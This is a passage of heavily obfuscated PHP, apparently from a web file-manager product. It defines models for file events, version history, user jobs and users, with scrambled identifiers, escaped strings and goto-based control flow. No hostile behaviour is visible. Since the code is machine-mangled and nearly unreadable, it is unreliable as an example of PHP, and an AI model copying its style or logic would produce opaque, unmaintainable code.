$E™•„‰á‘¯ = array($Fñ‚ï´„¨[1056] => $Aï·—ÈŠÚ, $Fñ‚ï´„¨[1908] => $b‘Á£ã·ŠÓ[$Fñ‚ï´„¨[28]], $Fñ‚ï´„¨[1888] => $b‘Á£ã·ŠÓ[$Fñ‚ï´„¨[493]], $Fñ‚ï´„¨[1057] => $d²¥Á‰½è°, $Fñ‚ï´„¨[1909] => $D£¶…›èåµ[$Fñ‚ï´„¨[28]], $Fñ‚ï´„¨[1910] => $D£¶…›èåµ[$Fñ‚ï´„¨[493]]); goto CÉ‘äÉõÇ‡; CÉ‘äÉõÇ‡: $this->addEvent($B³ÂÏœÂÙó, $Fñ‚ï´„¨[519], $E™•„‰á‘¯); $D¡‡†Şô‰ = $fÔ„Šæê‚Ú->sourceInfo($B³ÂÏœÂÙó); $E™•„‰á‘¯ = array($Fñ‚ï´„¨[394] => $D¡‡†Şô‰[$Fñ‚ï´„¨[394]], $Fñ‚ï´„¨[28] => $D¡‡†Şô‰[$Fñ‚ï´„¨[28]]); goto e£­ïÔ¢ÎË; EÆï­İÛ: $Fñ‚ï´„¨ =& $_SERVER[´¬]; $fÔ„Šæê‚Ú = Model($Fñ‚ï´„¨[1206]); $D¡‡†Şô‰ = $fÔ„Šæê‚Ú->sourceInfo($B³ÂÏœÂÙó); goto Cªò‚ß Œ˜; cÂ§ Çî„œ: } public function eventCopy($b”¯‡¶‘—‡) { $this->eventCreate($b”¯‡¶‘—‡, $_SERVER[´¬][517]); } public function eventRename($EŠÉ›¸õ’¹, $eïÔ“¾›½Õ, $eğõé‘ƒé„) { $cîø¬•…µ =& $_SERVER[´¬]; $e¤ãª¢Í÷ö = array($cîø¬•…µ[1056] => $eïÔ“¾›½Õ, $cîø¬•…µ[1057] => $eğõé‘ƒé„); return $this->addEvent($EŠÉ›¸õ’¹, $cîø¬•…µ[1220], $e¤ãª¢Í÷ö); } public function eventAddComment($EšäÓª¡Á¦, $D‚¿ÊšÁ¦) { return $this->addEvent($EšäÓª¡Á¦, $_SERVER[´¬][1912], $D‚¿ÊšÁ¦); } public function eventAddDesc($f¶™ğç³Ã , $e‚¯Üöñ±£) { return $this->addEvent($f¶™ğç³Ã , $_SERVER[´¬][1913], $e‚¯Üöñ±£); } public function listBySource($bˆ•âî»·í) { goto fÌî¦˜á­ó; EÌŒ ¥ÅÒ: if ($C¹í—š×˜[$dÌ¬Åß‚ÒŞ[401]] == $dÌ¬Åß‚ÒŞ[87]) { $C×ÙÆª‰Äù = Model($dÌ¬Åß‚ÒŞ[1206])->listSearchChildren($bˆ•âî»·í, 20000); $C×ÙÆª‰Äù[] = $bˆ•âî»·í . $dÌ¬Åß‚ÒŞ[374]; $BÆİàµµ™¹ = array($dÌ¬Åß‚ÒŞ[394] => array($dÌ¬Åß‚ÒŞ[7], $C×ÙÆª‰Äù)); } $B©ÂÒŞØÇŸ = $this->where($BÆİàµµ™¹)->order($dÌ¬Åß‚ÒŞ[1914])->selectPage(); if ($B©ÂÒŞØÇŸ[$dÌ¬Åß‚ÒŞ[363]][$dÌ¬Åß‚ÒŞ[364]] == 0) { $B©ÂÒŞØÇŸ[$dÌ¬Åß‚ÒŞ[363]][$dÌ¬Åß‚ÒŞ[364]] = 1; $B©ÂÒŞØÇŸ[$dÌ¬Åß‚ÒŞ[366]] = array(array($dÌ¬Åß‚ÒŞ[408] => $bˆ•âî»·í, $dÌ¬Åß‚ÒŞ[1897] => $C¹í—š×˜[$dÌ¬Åß‚ÒŞ[476]], $dÌ¬Åß‚ÒŞ[1518] => $C¹í—š×˜[$dÌ¬Åß‚ÒŞ[430]], $dÌ¬Åß‚ÒŞ[413] => $dÌ¬Åß‚ÒŞ[1915], $dÌ¬Åß‚ÒŞ[414] => $C¹í—š×˜[$dÌ¬Åß‚ÒŞ[193]], $dÌ¬Åß‚ÒŞ[1520] => $dÌ¬Åß‚ÒŞ[33])); } goto F±Õ‹Ê½Ÿ’; F±Õ‹Ê½Ÿ’: return $this->eventListParse($B©ÂÒŞØÇŸ, $bˆ•âî»·í); goto EéëÚƒô„µ; fÌî¦˜á­ó: $dÌ¬Åß‚ÒŞ =& $_SERVER[´¬]; $C¹í—š×˜ = Model($dÌ¬Åß‚ÒŞ[1206])->sourceInfo($bˆ•âî»·í); $BÆİàµµ™¹ = array($dÌ¬Åß‚ÒŞ[408] => $bˆ•âî»·í); goto EÌŒ ¥ÅÒ; EéëÚƒô„µ: } private function eventListParse($D«Ò ‡ôÂ˜, $böå°¤ÛÚé) { goto E´„ÀÆœ®; cğù‘àÌëĞ: $D˜ÔÊ³Ÿƒñ = array_to_keyvalue($Cù‚ãòÁØè, $D™È‚†ò¼à[33], $D™È‚†ò¼à[1903]); foreach ($Cù‚ãòÁØè as $eÏ´™¦§²ò) { $d¨°İèéÊ = $eÏ´™¦§²ò[$D™È‚†ò¼à[429]]; if ($eÏ´™¦§²ò[$D™È‚†ò¼à[29]] == $D™È‚†ò¼à[519] && isset($d¨°İèéÊ[$D™È‚†ò¼à[1056]])) { $FÄ¶‡“êÖí[] = $d¨°İèéÊ[$D™È‚†ò¼à[1056]] . $D™È‚†ò¼à[33]; $FÄ¶‡“êÖí[] = $d¨°İèéÊ[$D™È‚†ò¼à[1057]] . $D™È‚†ò¼à[33]; } if ($eÏ´™¦§²ò[$D™È‚†ò¼à[29]] == $D™È‚†ò¼à[1911] && isset($d¨°İèéÊ[$D™È‚†ò¼à[394]])) { $FÄ¶‡“êÖí[] = $d¨°İèéÊ[$D™È‚†ò¼à[394]] . $D™È‚†ò¼à[33]; } } $FÄ¶‡“êÖí = array_merge($FÄ¶‡“êÖí, $D˜ÔÊ³Ÿƒñ, array($böå°¤ÛÚé . $D™È‚†ò¼à[33])); goto a¢³Î‘ôğ˜; a¢³Î‘ôğ˜: $FÄ¶‡“êÖí = array_unique($FÄ¶‡“êÖí); $A²Š¾½õÂÄ = array_unique(array_to_keyvalue($Cù‚ãòÁØè, $D™È‚†ò¼à[33], $D™È‚†ò¼à[1526])); $Bë¡¿Šõ – = Model($D™È‚†ò¼à[505])->userListInfo($A²Š¾½õÂÄ); goto EÒÄ‘ƒ‚; c¦Ş¡ëÛä: $D«Ò ‡ôÂ˜[$D™È‚†ò¼à[366]] = $Cù‚ãòÁØè; return $D«Ò ‡ôÂ˜; goto f…Úš•¶¸ó; EÒÄ‘ƒ‚: $FÒ«±¦Ùµ¶ = Model($D™È‚†ò¼à[790])->sourceListInfo($FÄ¶‡“êÖí, !0); foreach ($Cù‚ãòÁØè as &$eÏ´™¦§²ò) { if ($eÏ´™¦§²ò[$D™È‚†ò¼à[29]] == $D™È‚†ò¼à[519] && isset($eÏ´™¦§²ò[$D™È‚†ò¼à[429]][$D™È‚†ò¼à[1056]])) { $eÏ´™¦§²ò[$D™È‚†ò¼à[429]][$D™È‚†ò¼à[1056]] = $FÒ«±¦Ùµ¶[$eÏ´™¦§²ò[$D™È‚†ò¼à[429]][$D™È‚†ò¼à[1056]]]; $eÏ´™¦§²ò[$D™È‚†ò¼à[429]][$D™È‚†ò¼à[1057]] = $FÒ«±¦Ùµ¶[$eÏ´™¦§²ò[$D™È‚†ò¼à[429]][$D™È‚†ò¼à[1057]]]; } if ($eÏ´™¦§²ò[$D™È‚†ò¼à[29]] == $D™È‚†ò¼à[1911] && isset($eÏ´™¦§²ò[$D™È‚†ò¼à[429]][$D™È‚†ò¼à[394]])) { $eÏ´™¦§²ò[$D™È‚†ò¼à[429]][$D™È‚†ò¼à[394]] = $FÒ«±¦Ùµ¶[$eÏ´™¦§²ò[$D™È‚†ò¼à[429]][$D™È‚†ò¼à[394]]]; } $eÏ´™¦§²ò[$D™È‚†ò¼à[85]] = $FÒ«±¦Ùµ¶[$eÏ´™¦§²ò[$D™È‚†ò¼à[394]]]; $eÏ´™¦§²ò[$D™È‚†ò¼à[1916]] = $FÒ«±¦Ùµ¶[$eÏ´™¦§²ò[$D™È‚†ò¼à[1903]]]; if ($eÏ´™¦§²ò[$D™È‚†ò¼à[29]] == $D™È‚†ò¼à[1655]) { $eÏ´™¦§²ò[$D™È‚†ò¼à[1916]] = $eÏ´™¦§²ò[$D™È‚†ò¼à[85]]; $eÏ´™¦§²ò[$D™È‚†ò¼à[1903]] = $eÏ´™¦§²ò[$D™È‚†ò¼à[1916]][$D™È‚†ò¼à[394]]; $eÏ´™¦§²ò[$D™È‚†ò¼à[85]] = !1; $eÏ´™¦§²ò[$D™È‚†ò¼à[394]] = $D™È‚†ò¼à[33]; } $eÏ´™¦§²ò[$D™È‚†ò¼à[1846]] = $Bë¡¿Šõ –[$eÏ´™¦§²ò[$D™È‚†ò¼à[1526]]]; } unset($eÏ´™¦§²ò); goto c¦Ş¡ëÛä; E´„ÀÆœ®: $D™È‚†ò¼à =& $_SERVER[´¬]; $Cù‚ãòÁØè = $D«Ò ‡ôÂ˜[$D™È‚†ò¼à[366]]; $FÄ¶‡“êÖí = array_to_keyvalue($Cù‚ãòÁØè, $D™È‚†ò¼à[33], $D™È‚†ò¼à[394]); goto cğù‘àÌëĞ; f…Úš•¶¸ó: } public function removeBySource($a¦‘ˆ°©Ò) { $AáŞ¥ÏÒ‚™ = array($_SERVER[´¬][408] => $a¦‘ˆ°©Ò); $this->where($AáŞ¥ÏÒ‚™)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\162\x63\145\137\x68\151\x73\x74\x6f\x72\x79"; public function historyCount($F¢”†æØÇ) { goto F¢´»ø©È™; e±ÌÀöŠõÜ: $fîÔÓÙ¬ğÒ = array($a£…œò†äœ[394], $a£…œò†äœ[1721] => $a£…œò†äœ[478]); $dˆÁ¾¬¨Ä = array($a£…œò†äœ[394] => array($a£…œò†äœ[7], $F¢”†æØÇ)); $F¿‡Ï¯õç¹ = $this->field($fîÔÓÙ¬ğÒ)->where($dˆÁ¾¬¨Ä)->group($a£…œò†äœ[394])->select(); goto cÑÏíí¤¸ã; cÑÏíí¤¸ã: return array_to_keyvalue($F¿‡Ï¯õç¹, $a£…œò†äœ[394], $a£…œò†äœ[478]); goto F‹Ñåõ´™‹; F¢´»ø©È™: $a£…œò†äœ =& $_SERVER[´¬]; if (!$F¢”†æØÇ) { return array(); } if (is_string($F¢”†æØÇ) || is_int($F¢”†æØÇ)) { $F¢”†æØÇ = array($F¢”†æØÇ); } goto e±ÌÀöŠõÜ; F‹Ñåõ´™‹: } public function addHistory($d×˜Û÷¨»–, $eğï‚‡µÓŸ = '') { $aÍ¦»¸œò’ =& $_SERVER[´¬]; $BùĞÓŒœùÔ = array($aÍ¦»¸œò’[408] => $d×˜Û÷¨»–[$aÍ¦»¸œò’[394]], $aÍ¦»¸œò’[1518] => isset($d×˜Û÷¨»–[$aÍ¦»¸œò’[432]]) ? $d×˜Û÷¨»–[$aÍ¦»¸œò’[432]] : $d×˜Û÷¨»–[$aÍ¦»¸œò’[430]], $aÍ¦»¸œò’[446] => $d×˜Û÷¨»–[$aÍ¦»¸œò’[445]], $aÍ¦»¸œò’[547] => $d×˜Û÷¨»–[$aÍ¦»¸œò’[78]], $aÍ¦»¸œò’[1917] => $eğï‚‡µÓŸ); $F‚½â˜Îäö = $GLOBALS[$aÍ¦»¸œò’[6]][$aÍ¦»¸œò’[88]][$aÍ¦»¸œò’[1105]]; if ($F‚½â˜Îäö > 1) { $this->historyAutoClear($BùĞÓŒœùÔ[$aÍ¦»¸œò’[394]]); $this->add($BùĞÓŒœùÔ); } Hook::trigger($aÍ¦»¸œò’[1918], $BùĞÓŒœùÔ); Model($aÍ¦»¸œò’[1919])->eventFileEdit($d×˜Û÷¨»–[$aÍ¦»¸œò’[394]]); } private function historyAutoClear($D¢ âŠÛë½) { goto c¾Ïí©ÆÒ; eƒ£Õ¶‚§: $A¦™™À°ƒ = array($E÷ŠíÛíÔ¹[408] => $D¢ âŠÛë½); $c‹Ãó»•Â = $this->field($E÷ŠíÛíÔ¹[1920])->where($A¦™™À°ƒ)->order($E÷ŠíÛíÔ¹[1914])->select(); if (!$c‹Ãó»•Â || $Bí”ºÕõ× >= count($c‹Ãó»•Â)) { return; } goto b±¹ŠØ‘Õ»; b±¹ŠØ‘Õ»: $FÔÛÍìô = array_to_keyvalue($c‹Ãó»•Â, $E÷ŠíÛíÔ¹[33], $E÷ŠíÛíÔ¹[392]); $FÔÛÍìô = array_slice($FÔÛÍìô, $Bí”ºÕõ×); $F«Ï°­ò§¿ = array_to_keyvalue($c‹Ãó»•Â, $E÷ŠíÛíÔ¹[33], $E÷ŠíÛíÔ¹[445]); goto B˜šÃµ†‹—; d„øì˜Ñ•Æ: $this->where($A¦™™À°ƒ)->delete(); Model($E÷ŠíÛíÔ¹[448])->remove($F«Ï°­ò§¿); goto f¯ğ£Ô’º; B˜šÃµ†‹—: $F«Ï°­ò§¿ = array_slice($F«Ï°­ò§¿, $Bí”ºÕõ×); if (!$FÔÛÍìô || !$F«Ï°­ò§¿) { return; } $A¦™™À°ƒ = array($E÷ŠíÛíÔ¹[410] => array($E÷ŠíÛíÔ¹[7], $FÔÛÍìô)); goto d„øì˜Ñ•Æ; c¾Ïí©ÆÒ: $E÷ŠíÛíÔ¹ =& $_SERVER[´¬]; $d®ãÅÀŠÌ¾ = Model($E÷ŠíÛíÔ¹[730])->get($E÷ŠíÛíÔ¹[1126]); $Eõà×•ñ°£ = $GLOBALS[$E÷ŠíÛíÔ¹[6]][$E÷ŠíÛíÔ¹[88]][$E÷ŠíÛíÔ¹[1105]]; goto c Ô™Üšìä; c Ô™Üšìä: $Bí”ºÕõ× = $d®ãÅÀŠÌ¾ == $E÷ŠíÛíÔ¹[1127] ? 5 : $Eõà×•ñ°£; if ($Eõà×•ñ°£ <= 1) { $Bí”ºÕõ× = 1; } if ($Bí”ºÕõ× >= 500) { return; } goto eƒ£Õ¶‚§; f¯ğ£Ô’º: } public function listData($Fğ¬êÈ“Ó) { goto BõÒß¾¸‰; e»…Åëà: $b’«Îë¨†Ğ = 5; if ($eøù÷  Œâ == $f’Ğè¯ÂÖ•[1127]) { $eí‰³è½¸ö[$f’Ğè¯ÂÖ•[366]] = array_slice($eí‰³è½¸ö[$f’Ğè¯ÂÖ•[366]], 0, $b’«Îë¨†Ğ); $eí‰³è½¸ö[$f’Ğè¯ÂÖ•[363]] = array($f’Ğè¯ÂÖ•[1922] => 1, $f’Ğè¯ÂÖ•[1923] => 20, $f’Ğè¯ÂÖ•[1924] => 1, $f’Ğè¯ÂÖ•[1925] => count($eí‰³è½¸ö[$f’Ğè¯ÂÖ•[366]])); } return $eí‰³è½¸ö; goto d†È²Ö‡õ; BõÒß¾¸‰: $f’Ğè¯ÂÖ• =& $_SERVER[´¬]; $D‡ôÙíˆ÷ = array($f’Ğè¯ÂÖ•[408] => $Fğ¬êÈ“Ó); $d¾„Ì¼­Ó´ = $f’Ğè¯ÂÖ•[1921]; goto d–ŠÍ¨¸°; d–ŠÍ¨¸°: $eí‰³è½¸ö = $this->field($d¾„Ì¼­Ó´)->where($D‡ôÙíˆ÷)->order($f’Ğè¯ÂÖ•[1914])->selectPage(); $this->_listAppendUser($eí‰³è½¸ö[$f’Ğè¯ÂÖ•[366]]); $eøù÷  Œâ = Model($f’Ğè¯ÂÖ•[730])->get($f’Ğè¯ÂÖ•[1126]); goto e»…Åëà; d†È²Ö‡õ: } protected function _listAppendUser(&$a¶Áè®¼¶) { $f£¶‚è±œ¾ =& $_SERVER[´¬]; $AÈ…ÊÆ¦Îø = array_to_keyvalue($a¶Áè®¼¶, $f£¶‚è±œ¾[33], $f£¶‚è±œ¾[1526]); $Fö÷©º ë­ = Model($f£¶‚è±œ¾[505])->userListInfo($AÈ…ÊÆ¦Îø); foreach ($a¶Áè®¼¶ as &$cÁ–— ­‰‰) { $bâ¾ Ô™Ë = $cÁ–— ­‰‰[$f£¶‚è±œ¾[1526]]; $cÁ–— ­‰‰[$f£¶‚è±œ¾[430]] = $Fö÷©º ë­[$bâ¾ Ô™Ë] ? $Fö÷©º ë­[$bâ¾ Ô™Ë] : !1; } unset($cÁ–— ­‰‰); } public function fileInfo($C®¢æÌ°œ) { $Båàç†íò‹ =& $_SERVER[´¬]; $bé·òÛÂ— = $this->tablePrefix; $b‡êÓçİ¨ = "{$bé·òÛÂ—}\x69\157\137\146\x69\x6c\x65\40\146\151\154\145\x73\x20\157\x6e\40\x66\x69\x6c\x65\x73\56\x66\151\154\145\111\x44\40\75\40\x68\151\x73\x74\x6f\162\171\56\146\x69\154\145\x49\104"; return $this->alias($Båàç†íò‹[1926])->where(array($Båàç†íò‹[410] => $C®¢æÌ°œ))->join($b‡êÓçİ¨, $Båàç†íò‹[1927])->find(); } public function removeItem($dÚ§ï™™ö) { $b§áİ¸§ëŠ =& $_SERVER[´¬]; $b§°æŒ¹¤™ = array($b§áİ¸§ëŠ[410] => $dÚ§ï™™ö); $e‰÷øÁ»¹ = $this->where($b§°æŒ¹¤™)->find(); if ($e‰÷øÁ»¹) { $C‰ø±ÏöíÖ = $this->where($b§°æŒ¹¤™)->delete(); Model($b§áİ¸§ëŠ[448])->remove($e‰÷øÁ»¹[$b§áİ¸§ëŠ[445]]); return $C‰ø±ÏöíÖ; } return !1; } public function removeBySource($fÑÜ‹Ö„Á„) { goto aŒ¢†Âåã; aŒ¢†Âåã: $EŒÀ©é†Åß =& $_SERVER[´¬]; if (!$fÑÜ‹Ö„Á„) { return !1; } if (!is_array($fÑÜ‹Ö„Á„)) { $fÑÜ‹Ö„Á„ = array($fÑÜ‹Ö„Á„); } goto e¢ãÎŒÒ›; e¢ãÎŒÒ›: $AÎ„à†Šò˜ = array($EŒÀ©é†Åß[408] => array($EŒÀ©é†Åß[7], $fÑÜ‹Ö„Á„)); $aŠ‚™ÜÙó = $this->field($EŒÀ©é†Åß[446])->where($AÎ„à†Šò˜)->select(); if ($aŠ‚™ÜÙó) { $this->where($AÎ„à†Šò˜)->delete(); $aç¬‚Ú–¥² = array_to_keyvalue($aŠ‚™ÜÙó, $EŒÀ©é†Åß[33], $EŒÀ©é†Åß[445]); Model($EŒÀ©é†Åß[448])->remove($aç¬‚Ú–¥²); } goto a‡ÆîÇ‘¸ô; a‡ÆîÇ‘¸ô: return !0; goto C·ƒÂå·‰; C·ƒÂå·‰: } public function setDetail($aÙ­ØÛ£ôÕ, $b¥Š”Öª Ë) { $C·«Ğ‹Âª™ =& $_SERVER[´¬]; return $this->where(array($C·«Ğ‹Âª™[410] => $aÙ­ØÛ£ôÕ))->save(array($C·«Ğ‹Âª™[1917] => $b¥Š”Öª Ë)); } public function rollbackToItem($C‹‹¾¡î²—, $d½ÒßÕ†í) { goto d¶¬ç£–‹Ÿ; Eƒ¥ºï†á: $fô¯º¢»ø = $this->find($d½ÒßÕ†í); $A÷ó­ìèà½ = array($f¦ãÜ©¥ê¦[445] => $fô¯º¢»ø[$f¦ãÜ©¥ê¦[445]], $f¦ãÜ©¥ê¦[78] => $fô¯º¢»ø[$f¦ãÜ©¥ê¦[78]], $f¦ãÜ©¥ê¦[84] => time(), $f¦ãÜ©¥ê¦[432] => USER_ID); Model($f¦ãÜ©¥ê¦[790])->where(array($f¦ãÜ©¥ê¦[394] => $C‹‹¾¡î²—))->save($A÷ó­ìèà½); goto fÁ‚”Øááµ; fÁ‚”Øááµ: return $this->where(array($f¦ãÜ©¥ê¦[410] => $d½ÒßÕ†í))->delete(); goto cİù›ª«›”; d¶¬ç£–‹Ÿ: $f¦ãÜ©¥ê¦ =& $_SERVER[´¬]; $B©´Ëì÷Õ¢ = Model($f¦ãÜ©¥ê¦[790])->sourceInfo($C‹‹¾¡î²—); $this->addHistory($B©´Ëì÷Õ¢, LNG($f¦ãÜ©¥ê¦[1928])); goto Eƒ¥ºï†á; cİù›ª«›”: } public function clearSame($Fù¼Ş³È±°) { goto aˆ¬ÕÚµ—£; aˆ¬ÕÚµ—£: $d»Øù¯…Öî =& $_SERVER[´¬]; $bˆš…à¡˜ = $this->listData($Fù¼Ş³È±°); $añóÑ‰“ãŠ = array_to_keyvalue_group($bˆš…à¡˜, $d»Øù¯…Öî[445]); goto f‚ô×Ù¿ÒÙ; DÔÑ—Ä‘÷¿: if (!$cÖ¸°”ØÏ) { return; } $this->where(array($d»Øù¯…Öî[392] => array($d»Øù¯…Öî[7], $cÖ¸°”ØÏ)))->delete(); Model($d»Øù¯…Öî[448])->remove($eŠí‰÷ÕÔ); goto bğÚÔ¢íÂ; f‚ô×Ù¿ÒÙ: $eŠí‰÷ÕÔ = array(); $cÖ¸°”ØÏ = array(); foreach ($añóÑ‰“ãŠ as $Fß­â¯¤Œğ) { if (!$Fß­â¯¤Œğ || count($Fß­â¯¤Œğ) <= 1) { continue; } foreach ($Fß­â¯¤Œğ as $DŞ‰ÎÕœŒ) { $eŠí‰÷ÕÔ[] = $DŞ‰ÎÕœŒ[$d»Øù¯…Öî[445]]; $cÖ¸°”ØÏ[] = $DŞ‰ÎÕœŒ[$d»Øù¯…Öî[392]]; } } goto DÔÑ—Ä‘÷¿; bğÚÔ¢íÂ: } public function userSpace() { $E¿ñÅ½öŞ£ =& $_SERVER[´¬]; $aô‹‘©×½ = $this->tablePrefix; $C‹ñ¶¾Ÿ = array($E¿ñÅ½öŞ£[1518] => USER_ID); $BËŒ—éù²Ø = "{$aô‹‘©×½}\x69\x6f\x5f\x66\151\154\145\40\146\151\154\x65\163\x20\157\156\40\146\151\x6c\145\x73\56\x66\151\154\145\x49\104\x20\75\40\150\x69\x73\x74\157\162\x79\56\146\x69\154\145\111\x44"; return $this->alias($E¿ñÅ½öŞ£[1926])->where($C‹ñ¶¾Ÿ)->join($BËŒ—éù²Ø, $E¿ñÅ½öŞ£[1927])->sum($E¿ñÅ½öŞ£[78]); } } goto d½•×Ú¤Í; fùì¡ƒ›Ğô: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\152\x6f\x62\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\x64\145\163\143", "\163\157\x72\164"); const JOB_KEY = "\163\x65\154\146\112\157\142\114\151\163\164"; public function listData($Dİ‹Ğ¨°Î£ = false, $aßÆ—Ş¹Ğ = "\x73\x6f\x72\164", $aÉ¢ƒì™‹² = false) { return parent::listData($Dİ‹Ğ¨°Î£, $aßÆ—Ş¹Ğ, $aÉ¢ƒì™‹²); } public function remove($CÂáÓÀ‹Ü¦) { return parent::remove($CÂáÓÀ‹Ü¦); } public function add($C´ãÂ…ôš°) { $fÓ«ºñÓ =& $_SERVER[´¬]; if ($this->findByName($C´ãÂ…ôš°[$fÓ«ºñÓ[28]])) { return !1; } $C´ãÂ…ôš°[$fÓ«ºñÓ[1712]] = $this->getSort(); return parent::insert($C´ãÂ…ôš°); } private function getSort() { $f«º¥Š‘• =& $_SERVER[´¬]; $C†Æ‘Ğ‡¨® = parent::listData(); $Bã¦˜í„ = array_to_keyvalue($C†Æ‘Ğ‡¨®, $f«º¥Š‘•[33], $f«º¥Š‘•[1712]); return empty($Bã¦˜í„) ? 0 : max($Bã¦˜í„) + 1; } public function update($eœ¯¡İ˜ùœ, $fÆÖœŠÉİ…) { $C¤……ã¨–­ =& $_SERVER[´¬]; $E™›ˆ¹‚ó£ = parent::listData($eœ¯¡İ˜ùœ); $c“äå‹‡á„ = $this->findByName($fÆÖœŠÉİ…[$C¤……ã¨–­[28]]); if (!$E™›ˆ¹‚ó£ || $c“äå‹‡á„ && $c“äå‹‡á„[$C¤……ã¨–­[392]] != $E™›ˆ¹‚ó£[$C¤……ã¨–­[392]]) { return !1; } return parent::update($eœ¯¡İ˜ùœ, $fÆÖœŠÉİ…); } public function setUserJob($bÆá‘£—Ã¯, $dùÂÃ¦è) { goto DÌóÒ»¦‰; E £ˆºƒ‚È: $a¡ùñÑÔ—Ñ = rtrim($a¡ùñÑÔ—Ñ, $EÏ„ì˜ƒŞ[47]); Model($EÏ„ì˜ƒŞ[505])->metaSet($bÆá‘£—Ã¯, self::JOB_KEY, $a¡ùñÑÔ—Ñ); goto BÙâ›­ÈÒ; Fõç¿Î‹¼ß: $DÇ…ˆ­Ï•Í = array_to_keyvalue($f³»ƒÖÊåƒ, $EÏ„ì˜ƒŞ[28]); $a¡ùñÑÔ—Ñ = $EÏ„ì˜ƒŞ[374]; foreach ($dùÂÃ¦è as $DÚˆÎÏÏÔ) { if ($DÇ…ˆ­Ï•Í[$DÚˆÎÏÏÔ]) { $a¡ùñÑÔ—Ñ .= $DÇ…ˆ­Ï•Í[$DÚˆÎÏÏÔ][$EÏ„ì˜ƒŞ[392]] . $EÏ„ì˜ƒŞ[47]; } else { $d‡×ÒÆÚé¸ = $this->add($DÚˆÎÏÏÔ); $a¡ùñÑÔ—Ñ .= $d‡×ÒÆÚé¸ . $EÏ„ì˜ƒŞ[47]; } } goto E £ˆºƒ‚È; DÌóÒ»¦‰: $EÏ„ì˜ƒŞ =& $_SERVER[´¬]; if (!is_array($dùÂÃ¦è)) { $dùÂÃ¦è = array($dùÂÃ¦è); } $f³»ƒÖÊåƒ = parent::listData(); goto Fõç¿Î‹¼ß; BÙâ›­ÈÒ: } public function getUserJob($DšÌÆõ©–) { $CÃÖ²Õ¸¡¬ = Model($_SERVER[´¬][505])->metaGet($DšÌÆõ©–); return $this->getUserJobInfo($CÃÖ²Õ¸¡¬[self::JOB_KEY]); } public function getUserJobInfo($cøš‹¹Äâ») { goto Aíç£³¾¨; F‚Õâ§Ë½: $E©¼ËĞ­¤Ó = array_remove_key($E©¼ËĞ­¤Ó, $C‘‹ó´ó®[193]); $aùÛë‰®Òõ = array(); foreach ($D„Ş»„†•” as $E¸‹ö±èå‹) { if (isset($E©¼ËĞ­¤Ó[$E¸‹ö±èå‹])) { $aùÛë‰®Òõ[] = $E©¼ËĞ­¤Ó[$E¸‹ö±èå‹]; } } goto cÒæ²ìŠ©©; Aíç£³¾¨: $C‘‹ó´ó® =& $_SERVER[´¬]; $D„Ş»„†•” = explode($C‘‹ó´ó®[47], $cøš‹¹Äâ»); $E©¼ËĞ­¤Ó = parent::listData(); goto F‚Õâ§Ë½; cÒæ²ìŠ©©: return $aùÛë‰®Òõ; goto d­îì„–š·; d­îì„–š·: } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\162"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\x6d\x65" => "\165\x73\x65\x72\x5f\x6d\145\x74\141", "\155\145\x74\x61\106\x69\x65\154\144" => "\165\x73\145\x72\111\104"); protected $simpleField = "\x75\x73\x65\162\111\104\x2c\156\x69\x63\x6b\116\x61\x6d\145\54\156\141\x6d\145\54\x61\166\141\x74\x61\x72\54\x73\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($FùœÈš) { $BãÚâï“ø« =& $_SERVER[´¬]; $AÌØ³·ä§ = $BãÚâï“ø«[2111]; return array($BãÚâï“ø«[1759] => array($FùœÈš[0], $AÌØ³·ä§), $BãÚâï“ø«[1761] => array($FùœÈš[0], $AÌØ³·ä§), $BãÚâï“ø«[2112] => array($FùœÈš[0], $AÌØ³·ä§)); } protected function getInfo($Eáõìğ…Ç, $D¯„ÀùÒ•¦ = false) { $Aº‚ÌªÒÀ = $this->getInfoSimple($Eáõìğ…Ç); if (!is_array($Aº‚ÌªÒÀ)) { return array(); } if ($D¯„ÀùÒ•¦) { return $this->_getInfoApply($Aº‚ÌªÒÀ); } return $this->cacheFunctionGet($_SERVER[´¬][1768], $Eáõìğ…Ç); } protected function getInfoFull($C‘–ÄÈ•êˆ, $b—­ğÌ­çÂ = false) { $EéÎÑ’„ = $this->getInfoSimple($C‘–ÄÈ•êˆ); if (!is_array($EéÎÑ’„)) { return array(); } if ($b—­ğÌ­çÂ) { return $this->_getInfoApply($EéÎÑ’„, !0); return $this->_getInfoApply($EéÎÑ’„, !0); } return $this->cacheFunctionGet($_SERVER[´¬][2113], $C‘–ÄÈ•êˆ); } private function _getInfoApply($bõá‚˜®Œ, $eÙŞÀÆ¹çª = false) { goto dÃã¬¯ç³; d´‘éœÄ¸İ: $bõá‚˜®Œ = $this->_listDataApplyItem($bõá‚˜®Œ); $a †ëÔ¾õÓ = Model($dÙ¬ãÒ¸¯[1206])->metaGet($bõá‚˜®Œ[$dÙ¬ãÒ¸¯[85]][$dÙ¬ãÒ¸¯[394]]); $bõá‚˜®Œ[$dÙ¬ãÒ¸¯[2116]] = $f¡Å²Ãøˆã; goto d£¤¾†â“; d£¤¾†â“: $bõá‚˜®Œ[$dÙ¬ãÒ¸¯[85]][$dÙ¬ãÒ¸¯[1949]] = isset($a †ëÔ¾õÓ[$dÙ¬ãÒ¸¯[1950]]) ? $a †ëÔ¾õÓ[$dÙ¬ãÒ¸¯[1950]] : null; if ($eÙŞÀÆ¹çª) { $bõá‚˜®Œ[$dÙ¬ãÒ¸¯[443]] = $this->metaGet($bõá‚˜®Œ[$dÙ¬ãÒ¸¯[1526]]); } return $bõá‚˜®Œ; goto d…ÚîÎğŒì; dÃã¬¯ç³: $dÙ¬ãÒ¸¯ =& $_SERVER[´¬]; if (!$bõá‚˜®Œ) { return $bõá‚˜®Œ; } $f¡Å²Ãøˆã = md5($dÙ¬ãÒ¸¯[2114] . $bõá‚˜®Œ[$dÙ¬ãÒ¸¯[850]] . $dÙ¬ãÒ¸¯[2115] . $bõá‚˜®Œ[$dÙ¬ãÒ¸¯[28]]); goto d´‘éœÄ¸İ; 